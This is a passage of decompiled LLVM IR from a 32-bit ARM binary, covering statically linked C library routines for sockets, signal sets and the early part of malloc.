  %v7_115d8 = phi i32 [ %arg1, %dec_label_pc_115d4 ], [ %v6_115d8, %bb ]
  ret i32 %v7_115d8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_115e0 = load i32, i32* @r4, align 4
  store i32 %v3_115e0, i32* %stack_var_-24, align 4
  %v6_115e0 = load i32, i32* @r5, align 4
  %v9_115e0 = load i32, i32* @r6, align 4
  %v12_115e0 = load i32, i32* @r7, align 4
  %v15_115e0 = load i32, i32* @r8, align 4
  %v18_115e0 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @ip, align 4
  %v4_115ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 12776) to i32*), align 4
  %v2_115f0 = icmp eq i32 %v4_115ec, 0
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg4, i32* @r8, align 4
  br i1 %v2_115f0, label %dec_label_pc_11608, label %entry.dec_label_pc_11610_crit_edge

entry.dec_label_pc_11610_crit_edge:               ; preds = %entry
  br label %dec_label_pc_11610

dec_label_pc_11608:                               ; preds = %entry
  store i32 %v3_115e0, i32* @r4, align 4
  store i32 %v9_115e0, i32* @r6, align 4
  store i32 %v12_115e0, i32* @r7, align 4
  store i32 %v15_115e0, i32* @r8, align 4
  %v0_1160c = call i32 @__sys_send()
  br label %dec_label_pc_11610

dec_label_pc_11610:                               ; preds = %entry.dec_label_pc_11610_crit_edge, %dec_label_pc_11608
  %v0_11610 = call i32 @__libc_enable_asynccancel()
  %v0_11614 = load i32, i32* @r6, align 4
  store i32 %v0_11614, i32* @r1, align 4
  store i32 %v0_11610, i32* @r5, align 4
  %v0_11620 = load i32, i32* @r8, align 4
  store i32 %v0_11620, i32* @r3, align 4
  %v0_11624 = load i32, i32* @r4, align 4
  store i32 %v0_11624, i32* @r0, align 4
  %v0_11628 = call i32 @__sys_send()
  store i32 %v0_11628, i32* @r4, align 4
  %v0_11630 = load i32, i32* @r5, align 4
  %v1_11634 = call i32 @__libc_disable_asynccancel(i32 %v0_11630)
  %v0_11638 = load i32, i32* @r4, align 4
  %v2_1163c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1163c, i32* @r4, align 4
  store i32 %v6_115e0, i32* @r5, align 4
  store i32 %v9_115e0, i32* @r6, align 4
  store i32 %v12_115e0, i32* @r7, align 4
  store i32 %v15_115e0, i32* @r8, align 4
  store i32 %v18_115e0, i32* @lr, align 4
  ret i32 %v0_11638

; uselistorder directives
  uselistorder label %dec_label_pc_11610, { 1, 0 }
}

define i32 @__sys_sendto() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1164c = load i32, i32* @r4, align 4
  store i32 %v3_1164c, i32* %stack_var_-16, align 4
  %v0_11660 = load i32, i32* @r0, align 4
  store i32 %v0_11660, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11660, -4095
  br i1 %tmp, label %dec_label_pc_11688, label %dec_label_pc_11670

dec_label_pc_11670:                               ; preds = %entry
  %v0_11674 = call i32 @__aeabi_read_tp()
  %v3_11678 = load i16, i16* @global_var_216f0.341, align 2
  %v4_11678 = sext i16 %v3_11678 to i32
  %v0_1167c = load i32, i32* %r2.global-to-local, align 4
  %v1_1167c = sub i32 0, %v0_1167c
  store i32 %v1_1167c, i32* %r2.global-to-local, align 4
  %v3_11680 = add i32 %v4_11678, %v0_11674
  %v4_11680 = inttoptr i32 %v3_11680 to i32*
  store i32 %v1_1167c, i32* %v4_11680, align 4
  %v2_11688.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_11688

dec_label_pc_11688:                               ; preds = %entry, %dec_label_pc_11670
  %v1_1168c = phi i32 [ %v0_11660, %entry ], [ -1, %dec_label_pc_11670 ]
  %v2_11688 = phi i32 [ %v3_1164c, %entry ], [ %v2_11688.pre, %dec_label_pc_11670 ]
  store i32 %v2_11688, i32* @r4, align 4
  ret i32 %v1_1168c

; uselistorder directives
  uselistorder i32 %v0_11660, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11688, { 1, 0 }
}

define i32 @"$d.2"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11690:
  %v0_11690 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11690, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11690
  %v5_11690 = udiv i32 %arg3, 4
  %v6_11690 = and i32 %v5_11690, %arg1
  %v5_11694 = sub nsw i32 32, %v6_11690
  %v6_11694 = shl i32 %v6_11690, %v5_11694
  %v9_11694 = and i32 %v6_11694, %arg2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11690, %bb
  %v10_11694 = phi i32 [ %arg1, %dec_label_pc_11690 ], [ %v9_11694, %bb ]
  ret i32 %v10_11694

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_11698 = load i32, i32* @r4, align 4
  store i32 %v3_11698, i32* %stack_var_-32, align 4
  %v6_11698 = load i32, i32* @r5, align 4
  %v9_11698 = load i32, i32* @r6, align 4
  %v12_11698 = load i32, i32* @r7, align 4
  %v15_11698 = load i32, i32* @r8, align 4
  %v18_11698 = load i32, i32* @sb, align 4
  %v21_11698 = load i32, i32* @sl, align 4
  %v24_11698 = load i32, i32* @lr, align 4
  %v4_116a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 12776) to i32*), align 4
  %v2_116b0 = icmp eq i32 %v4_116a8, 0
  store i32 %arg1, i32* %sb.global-to-local, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg5, i32* @r4, align 4
  br i1 %v2_116b0, label %dec_label_pc_116d0, label %dec_label_pc_116dc

dec_label_pc_116d0:                               ; preds = %entry
  store i32 %v3_11698, i32* @r4, align 4
  store i32 %v12_11698, i32* @r7, align 4
  store i32 %v15_11698, i32* @r8, align 4
  store i32 %v18_11698, i32* %sb.global-to-local, align 4
  %v0_116d8 = call i32 @__sys_sendto()
  br label %dec_label_pc_116dc

dec_label_pc_116dc:                               ; preds = %entry, %dec_label_pc_116d0
  %v0_116dc = call i32 @__libc_enable_asynccancel()
  store i32 %v0_116dc, i32* @r5, align 4
  %v0_116f0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_116f0, i32* @r0, align 4
  %v0_116f8 = call i32 @__sys_sendto()
  store i32 %v0_116f8, i32* @r4, align 4
  %v0_11700 = load i32, i32* @r5, align 4
  %v1_11704 = call i32 @__libc_disable_asynccancel(i32 %v0_11700)
  %v0_11708 = load i32, i32* @r4, align 4
  %v2_11710 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_11710, i32* @r4, align 4
  store i32 %v6_11698, i32* @r5, align 4
  store i32 %v9_11698, i32* @r6, align 4
  store i32 %v12_11698, i32* @r7, align 4
  store i32 %v15_11698, i32* @r8, align 4
  store i32 %v18_11698, i32* @sb, align 4
  store i32 %v21_11698, i32* @sl, align 4
  store i32 %v24_11698, i32* @lr, align 4
  ret i32 %v0_11708

; uselistorder directives
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_116dc, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11720 = load i32, i32* @r4, align 4
  store i32 %v3_11720, i32* %stack_var_-12, align 4
  %v0_11730 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11730, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11730, -4095
  br i1 %tmp, label %dec_label_pc_11758, label %dec_label_pc_11740

dec_label_pc_11740:                               ; preds = %entry
  %v0_11744 = call i32 @__aeabi_read_tp()
  %v3_11748 = load i16, i16* @global_var_216f0.341, align 2
  %v4_11748 = sext i16 %v3_11748 to i32
  store i32 %v4_11748, i32* @r3, align 4
  %v0_1174c = load i32, i32* %r2.global-to-local, align 4
  %v1_1174c = sub i32 0, %v0_1174c
  store i32 %v1_1174c, i32* %r2.global-to-local, align 4
  %v3_11750 = add i32 %v4_11748, %v0_11744
  %v4_11750 = inttoptr i32 %v3_11750 to i32*
  store i32 %v1_1174c, i32* %v4_11750, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_11758.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_11758

dec_label_pc_11758:                               ; preds = %entry, %dec_label_pc_11740
  %v1_1175c = phi i32 [ %v0_11730, %entry ], [ -1, %dec_label_pc_11740 ]
  %v2_11758 = phi i32 [ %v3_11720, %entry ], [ %v2_11758.pre, %dec_label_pc_11740 ]
  store i32 %v2_11758, i32* @r4, align 4
  ret i32 %v1_1175c

; uselistorder directives
  uselistorder i32 %v0_11730, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11758, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1) local_unnamed_addr {
dec_label_pc_11760:
  %v0_11760 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11760, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_11760
  %v2_11760 = load i32, i32* @r6, align 4
  %v5_11760 = udiv i32 %v2_11760, 4
  %v6_11760 = and i32 %v5_11760, %arg1
  call void @__pseudo_branch(i32 0)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_11760, %bb
  %v7_11764 = phi i32 [ %arg1, %dec_label_pc_11760 ], [ %v6_11760, %bb ]
  ret i32 %v7_11764

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11768 = load i32, i32* @r7, align 4
  store i32 %v3_11768, i32* %stack_var_-8, align 4
  %v0_11774 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11774, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_11774, -4095
  br i1 %tmp, label %dec_label_pc_1179c, label %dec_label_pc_11784

dec_label_pc_11784:                               ; preds = %entry
  %v0_11788 = call i32 @__aeabi_read_tp()
  %v3_1178c = load i16, i16* @global_var_216f0.341, align 2
  %v4_1178c = sext i16 %v3_1178c to i32
  store i32 %v4_1178c, i32* @r3, align 4
  %v0_11790 = load i32, i32* %r2.global-to-local, align 4
  %v1_11790 = sub i32 0, %v0_11790
  store i32 %v1_11790, i32* %r2.global-to-local, align 4
  %v3_11794 = add i32 %v4_1178c, %v0_11788
  %v4_11794 = inttoptr i32 %v3_11794 to i32*
  store i32 %v1_11790, i32* %v4_11794, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1179c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1179c

dec_label_pc_1179c:                               ; preds = %entry, %dec_label_pc_11784
  %v1_117a0 = phi i32 [ %v0_11774, %entry ], [ -1, %dec_label_pc_11784 ]
  %v2_1179c = phi i32 [ %v3_11768, %entry ], [ %v2_1179c.pre, %dec_label_pc_11784 ]
  store i32 %v2_1179c, i32* @r7, align 4
  ret i32 %v1_117a0

; uselistorder directives
  uselistorder i32 %v0_11774, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1179c, { 1, 0 }
}

define i32 @"$d"(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_117a4:
  %v0_117a4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_117a4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_117a4
  %v3_117a8 = call i32 @__libc_errno()
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_117a4, %bb
  %v4_117a8 = phi i32 [ %arg1, %dec_label_pc_117a4 ], [ %v3_117a8, %bb ]
  ret i32 %v4_117a8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp4 = icmp slt i32 %arg2, 1
  br i1 %tmp4, label %dec_label_pc_117c4, label %dec_label_pc_117bc

dec_label_pc_117bc:                               ; preds = %entry
  %v7_117c0 = icmp slt i32 %arg2, 65
  br i1 %v7_117c0, label %dec_label_pc_117e0, label %dec_label_pc_117c4

dec_label_pc_117c4:                               ; preds = %dec_label_pc_117bc, %entry
  %v0_117c8 = call i32 @__aeabi_read_tp()
  %v3_117cc = load i16, i16* @global_var_216f0.341, align 2
  %v4_117cc = sext i16 %v3_117cc to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_117d8 = add i32 %v4_117cc, %v0_117c8
  %v4_117d8 = inttoptr i32 %v3_117d8 to i32*
  store i32 22, i32* %v4_117d8, align 4
  %v0_117e8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_117e8

dec_label_pc_117e0:                               ; preds = %dec_label_pc_117bc
  %v0_117e0 = call i32 @__sigaddset()
  store i32 %v0_117e0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_117e8

dec_label_pc_117e8:                               ; preds = %dec_label_pc_117c4, %dec_label_pc_117e0
  %v0_117e8 = phi i32 [ %v0_117e8.pre, %dec_label_pc_117c4 ], [ %v0_117e0, %dec_label_pc_117e0 ]
  ret i32 %v0_117e8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_117e8, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_11804 = add i32 %tmp, 4
  %v3_11804 = inttoptr i32 %v2_11804 to i32*
  store i32 0, i32* %v3_11804, align 4
  %v1_11808 = load i32, i32* %r3.global-to-local, align 4
  %v2_11808 = inttoptr i32 %v1_11808 to i32*
  store i32 0, i32* %v2_11808, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11810 = load i32, i32* @r4, align 4
  store i32 %v3_11810, i32* %stack_var_-16, align 4
  %v6_11810 = load i32, i32* @r5, align 4
  %v9_11810 = load i32, i32* @r6, align 4
  %v7_11818 = icmp eq i32 %arg2, -1
  br i1 %v7_11818, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_11820 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_1183c

.thread16:                                        ; preds = %bb, %.thread4
  br label %dec_label_pc_11844

dec_label_pc_1183c:                               ; preds = %bb
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r6, align 4
  %v7_11840 = icmp slt i32 %arg1, 65
  br i1 %v7_11840, label %dec_label_pc_11860, label %dec_label_pc_11844

dec_label_pc_11844:                               ; preds = %.thread16, %dec_label_pc_1183c
  %v0_11848 = call i32 @__aeabi_read_tp()
  %v3_1184c = load i16, i16* @global_var_216f0.341, align 2
  %v4_1184c = sext i16 %v3_1184c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11858 = add i32 %v4_1184c, %v0_11848
  %v4_11858 = inttoptr i32 %v3_11858 to i32*
  store i32 22, i32* %v4_11858, align 4
  %v0_118b8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb33

dec_label_pc_11860:                               ; preds = %dec_label_pc_1183c
  %v2_11860 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11860, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_11868 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_11868, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
  %v0_11878 = call i32 @__sigaddset()
  %v0_11880 = load i32, i32* @r5, align 4
  store i32 %v0_11880, i32* %r1.global-to-local, align 4
  %v0_11884 = load i32, i32* @r6, align 4
  %v2_11884 = add i32 %v0_11884, 11872
  %v2_11888 = call i32 @__GI___sigismember(i32 %v2_11884, i32 %v0_11880)
  store i32 %v2_11860, i32* %r1.global-to-local, align 4
  %v0_1189c = load i32, i32* @r5, align 4
  %v3_118a8 = call i32 @__libc_sigaction(i32 %v0_1189c, i32 %v2_11860, i32 %v2_11820)
  %v1_118ac = icmp slt i32 %v3_118a8, 0
  br i1 %v1_118ac, label %bb32, label %bb31

bb31:                                             ; preds = %dec_label_pc_11860
  %v5_118b0 = load i32, i32* %stack_var_-56, align 4
  store i32 %v5_118b0, i32* %r1.global-to-local, align 4
  br label %bb33

bb32:                                             ; preds = %dec_label_pc_11860
  store i32 -1, i32* %r1.global-to-local, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %dec_label_pc_11844, %bb32
  %v0_118b8 = phi i32 [ %v5_118b0, %bb31 ], [ %v0_118b8.pre, %dec_label_pc_11844 ], [ -1, %bb32 ]
  %v2_118c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_118c0, i32* @r4, align 4
  store i32 %v6_11810, i32* @r5, align 4
  store i32 %v9_11810, i32* @r6, align 4
  ret i32 %v0_118b8

; uselistorder directives
  uselistorder i32 %v2_11860, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 ()* @__sigaddset, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 0, 1 }
  uselistorder label %bb33, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11844, { 1, 0 }
}

define i32 @__GI___sigismember(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_118d4 = add i32 %arg2, -1
  %v3_118d8 = udiv i32 %v1_118d4, 32
  %v4_118dc = mul nuw nsw i32 %v3_118d8, 4
  %v5_118dc = add i32 %v4_118dc, %arg1
  %v6_118dc = inttoptr i32 %v5_118dc to i32*
  %v7_118dc = load i32, i32* %v6_118dc, align 4
  %v1_118e0 = urem i32 %v1_118d4, 32
  %v7_118e8 = shl i32 1, %v1_118e0
  %v8_118e8 = and i32 %v7_118dc, %v7_118e8
  %v10_118e8 = icmp ne i32 %v8_118e8, 0
  %. = zext i1 %v10_118e8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_118d4, { 1, 0 }
}

define i32 @__sigaddset() local_unnamed_addr {
entry:
  %v0_118f8 = load i32, i32* @r1, align 4
  %v1_118f8 = add i32 %v0_118f8, -1
  %v3_118fc = udiv i32 %v1_118f8, 32
  %v0_11900 = load i32, i32* @r0, align 4
  %v4_11900 = mul nuw nsw i32 %v3_118fc, 4
  %v5_11900 = add i32 %v0_11900, %v4_11900
  %v6_11900 = inttoptr i32 %v5_11900 to i32*
  %v7_11900 = load i32, i32* %v6_11900, align 4
  %v1_11904 = urem i32 %v1_118f8, 32
  %v7_1190c = shl i32 1, %v1_11904
  %v8_1190c = or i32 %v7_11900, %v7_1190c
  store i32 %v8_1190c, i32* %v6_11900, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_118f8, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_1191c = add i32 %arg2, -1
  %v3_11920 = udiv i32 %v1_1191c, 32
  %v4_11924 = mul nuw nsw i32 %v3_11920, 4
  %v5_11924 = add i32 %v4_11924, %arg1
  %v6_11924 = inttoptr i32 %v5_11924 to i32*
  %v7_11924 = load i32, i32* %v6_11924, align 4
  %v1_11928 = urem i32 %v1_1191c, 32
  %tmp = shl i32 -1, %v1_11928
  %v8_11930 = add i32 %tmp, -1
  %v9_11930 = and i32 %v7_11924, %v8_11930
  store i32 %v9_11930, i32* %v6_11924, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1191c, { 1, 0 }
}

define i32 @__malloc_largebin_index(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v3_11940 = udiv i32 %arg1, 256
  store i32 %v3_11940, i32* %r1.global-to-local, align 4
  %v2_11944 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_11944, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  %v0_11950 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_11944, i32 %v0_11950)
  %v0_11954 = load i32, i32* %r1.global-to-local, align 4
  %v1_11954 = add i32 %v0_11954, 1048320
  %v3_11958 = udiv i32 %v1_11954, 65536
  %v1_1195c = and i32 %v3_11958, 8
  %v6_11960 = shl i32 %v0_11954, %v1_1195c
  %v1_11964 = add i32 %v6_11960, 520192
  %v3_11968 = udiv i32 %v1_11964, 65536
  %v1_1196c = and i32 %v3_11968, 4
  %v6_11970 = shl i32 %v6_11960, %v1_1196c
  %v1_11974 = add i32 %v6_11970, 245760
  %v3_11978 = udiv i32 %v1_11974, 65536
  %v1_1197c = and i32 %v3_11978, 2
  %v6_11980 = shl i32 %v6_11970, %v1_1197c
  store i32 %v6_11980, i32* %r1.global-to-local, align 4
  %v1_11984 = sub nsw i32 13, %v1_1195c
  %v2_11988 = sub nsw i32 %v1_11984, %v1_1196c
  %v3_1198c = udiv i32 %v6_11980, 32768
  %v4_1198c = sub nuw nsw i32 -1, %v3_1198c
  %v4_11990 = udiv i32 %v6_11980, 16384
  %v5_11990 = and i32 %v4_11990, %v4_1198c
  %v2_11994 = sub nsw i32 %v2_11988, %v1_1197c
  %v2_11998 = add nsw i32 %v2_11994, %v5_11990
  %v1_1199c = add nsw i32 %v2_11998, 6
  %v0_119a0 = load i32, i32* %ip.global-to-local, align 4
  %v6_119a0 = lshr i32 %v0_119a0, %v1_1199c
  %v3_119a4 = mul nsw i32 %v2_11998, 4
  %v1_119a8 = add nsw i32 %v3_119a4, 32
  %v1_119ac = urem i32 %v6_119a0, 4
  %v2_119b0 = or i32 %v1_119ac, %v1_119a8
  ret i32 %v2_119b0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_119b8 = load i32, i32* @r4, align 4
  %v6_119b8 = load i32, i32* @r5, align 4
  %v9_119b8 = load i32, i32* @r6, align 4
  %v12_119b8 = load i32, i32* @r7, align 4
  %v15_119b8 = load i32, i32* @r8, align 4
  %v18_119b8 = load i32, i32* @sb, align 4
  %v21_119b8 = load i32, i32* @sl, align 4
  %v24_119b8 = load i32, i32* @fp, align 4
  %v27_119b8 = load i32, i32* @lr, align 4
  store i32 108, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r1.global-to-local, align 4
  %v4_119cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 108) to i32*), align 4
  store i32 %v4_119cc, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v4_119d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 68) to i32*), align 4
  store i32 %v4_119d8, i32* %r1.global-to-local, align 4
  %v0_119dc = load i32, i32* @r0, align 4
  store i32 %v0_119dc, i32* @r5, align 4
  store i32 %v4_119cc, i32* %r2.global-to-local, align 4
  %v2_119e4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_119e4, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %ip.global-to-local, align 4
  %v4_119f0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 112) to i32*), align 4
  store i32 %v4_119f0, i32* %ip.global-to-local, align 4
  store i32 72188, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_119f0)
  %v0_119fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_119fc, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r1, align 4
  %v4_11a08 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 16) to i32*), align 4
  store i32 %v4_11a08, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11a14.430 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11a08)
  %v0_11a14 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_11a14, -32
  br i1 %tmp, label %dec_label_pc_11a38, label %dec_label_pc_11a1c

dec_label_pc_11a1c:                               ; preds = %entry
  store i32 64708, i32* %r2.global-to-local, align 4
  %v0_11a20 = call i32 @__aeabi_read_tp()
  store i32 %v0_11a20, i32* %r0.global-to-local, align 4
  %v3_11a24 = load i16, i16* @global_var_216f0.341, align 2
  %v4_11a24 = sext i16 %v3_11a24 to i32
  store i32 %v4_11a24, i32* %r2.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_11a30 = add i32 %v4_11a24, %v0_11a20
  %v4_11a30 = inttoptr i32 %v3_11a30 to i32*
  store i32 12, i32* %v4_11a30, align 4
  br label %dec_label_pc_122bc

dec_label_pc_11a38:                               ; preds = %entry
  %v1_11a38 = add i32 %v0_11a14, 11
  store i32 %v1_11a38, i32* %r0.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r2.global-to-local, align 4
  %v2_11a44 = icmp ugt i32 %v1_11a38, 14
  %v7_11a44 = icmp eq i32 %v1_11a38, 15
  %v2_11a48 = xor i1 %v7_11a44, true
  %v3_11a48 = and i1 %v2_11a44, %v2_11a48
  br i1 %v3_11a48, label %bb, label %bb141

bb:                                               ; preds = %dec_label_pc_11a38
  %v5_11a48 = and i32 %v1_11a38, -8
  store i32 %v5_11a48, i32* @sl, align 4
  br label %bb141

bb141:                                            ; preds = %dec_label_pc_11a38, %bb
  %v4_11a4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_11a4c, i32* @r0, align 4
  %v1_11a50 = inttoptr i32 %v4_11a4c to i32*
  %v2_11a50 = load i32, i32* %v1_11a50, align 4
  store i32 %v2_11a50, i32* @r4, align 4
  %v2_11a54 = xor i1 %v2_11a44, true
  %v3_11a54 = or i1 %v7_11a44, %v2_11a54
  br i1 %v3_11a54, label %bb142, label %bb143

bb142:                                            ; preds = %bb141
  store i32 16, i32* @sl, align 4
  br label %bb143

bb143:                                            ; preds = %bb141, %bb142
  %v1_11a58 = urem i32 %v2_11a50, 2
  %v2_11a58 = icmp eq i32 %v1_11a58, 0
  br i1 %v2_11a58, label %dec_label_pc_11a60, label %dec_label_pc_11a70

dec_label_pc_11a60:                               ; preds = %bb143
  %v2_11a60 = icmp eq i32 %v2_11a50, 0
  br i1 %v2_11a60, label %dec_label_pc_11a68, label %dec_label_pc_11e4c

dec_label_pc_11a68:                               ; preds = %dec_label_pc_11a60
  %v0_11a68 = call i32 @__malloc_consolidate()
  store i32 %v0_11a68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11e4c

dec_label_pc_11a70:                               ; preds = %bb143
  %v0_11a70 = load i32, i32* @sl, align 4
  %tmp204 = icmp ugt i32 %v0_11a70, %v2_11a50
